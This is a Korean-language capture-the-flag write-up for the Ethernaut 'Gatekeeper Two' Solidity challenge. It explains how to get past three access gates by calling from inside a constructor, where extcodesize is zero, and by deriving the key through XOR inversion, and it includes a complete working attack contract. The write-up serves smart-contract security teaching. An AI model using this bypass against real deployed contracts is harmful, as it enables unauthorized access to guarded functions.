# Ethernaut Level 14 - Gatekeeper Two

## 문제 설명

세 가지 조건을 통과하여 `entrant`로 등록하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

## 취약점 분석

### Gate 1
중간 컨트랙트로 호출 → `msg.sender != tx.origin`

### Gate 2
`extcodesize(caller()) == 0` → 코드 크기가 0이어야 함

컨트랙트의 **생성자(constructor) 실행 중**에는 `extcodesize == 0`이다!

→ **constructor 안에서 enter()를 호출하면 통과**

### Gate 3 — XOR 역연산

```
A ^ B == type(uint64).max (0xFFFFFFFFFFFFFFFF)
→ B = A ^ 0xFFFFFFFFFFFFFFFF
→ B = ~A

key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))))
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address _target) {
        // constructor 실행 중 → extcodesize == 0 → Gate 2 통과
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );
        IGatekeeperTwo(_target).enter(key);
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

배포 시 생성자에서 자동으로 공격이 실행된다:

```
_target : GatekeeperTwo 인스턴스 주소
```

### Step 2 — 확인

```js
await contract.entrant()
// → 내 지갑 주소
```

---

## 핵심 교훈

- `extcodesize == 0` 체크는 constructor 실행 중에는 우회 가능
- XOR 연산의 역연산을 이용한 키 계산
- 컨트랙트 배포 중 상태를 검증하는 로직은 신뢰할 수 없음
